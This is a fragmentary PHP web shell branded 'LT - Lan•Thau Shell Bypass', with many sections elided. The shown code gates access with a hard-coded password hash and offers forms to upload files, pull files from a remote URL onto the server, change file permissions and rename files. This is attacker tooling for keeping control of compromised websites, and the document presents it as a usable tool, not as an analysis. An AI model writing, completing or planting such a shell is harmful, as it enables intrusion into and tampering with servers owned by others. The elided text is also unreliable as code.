<?php
session_start();
$password = "b871bb8aaa91e2f7aba1882bf770e9e0";
...
<body>
  <br></br>
  <center><h1>LT - Lan•Thau</h1></center>
</body>
<form method="post">
...
function author() {
	echo "<center><br>LT - Lan•Thau Shell Bypass</center>";
	exit();
}
...
<input type="file" name="berkas"><input type="submit" name="berkasnya" value="Upload" class="up" style="cursor: pointer; border-color: #000000"><br>
<input type="text" name="darilink" class="up" placeholder="https://example.com/upload.txt">&nbsp;<input type="text" name="namalink" class="up" size="3" placeholder="file.txt"><input type="submit" name="linknya" class="up" value="Upload" style="cursor: pointer; border-color: #000000">
</form>';
...
if (isset($_GET['fileloc'])) {
	...
	<input type="submit" value="Change" name="chm0d" class="up" style="cursor: pointer; border-color: #000000"/>
	</form>';
	...
	<input type="submit" value="Change" name="gantin" class="up" style="cursor: pointer; border-color: #000000"/>
	</form>';
